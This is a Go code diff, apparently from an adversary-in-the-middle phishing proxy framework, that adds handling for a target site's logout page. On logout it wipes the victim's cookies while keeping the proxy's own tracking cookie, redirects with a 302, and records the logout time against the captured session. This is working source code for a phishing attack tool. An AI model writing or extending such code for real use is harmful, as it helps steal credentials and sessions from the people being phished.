@@ -341,6 +341,31 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							return req, resp
 						}
 					}
+
+					// if logout path, then redirect to the login page
+					if pl.isLogoutPage(req.URL.String()) {
+						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+						if resp != nil {
+							// empty all cookies to ensure, that user does not become automatically logged in after redirect
+							cookies := req.Cookies()
+							for i := range cookies {
+								cookie := cookies[i]
+								cookie_name := cookie.Name
+								if cookie_name != p.cookieName {
+									cookie := http.Cookie{
+											Name:  cookie_name,
+											Value: "",
+											Path: "/",
+									}
+									resp.Header.Add("Set-Cookie", cookie.String())
+								}
+							}
+							resp.Header.Add("Location", pl.logout.redirect_to)
+							p.db.SetSetLogoutTime(ps.Session.Id)
+							log.Important("[%d] [%s] user logged out - returning 302 to %s", ps.Session.Index, hiblue.Sprint(pl_name), pl.logout.redirect_to)
+							return req, resp
+						}
+					}
 				}
 
 				// check if lure hostname was triggered - by now all of the lure hostname handling should be done, so we can bail out
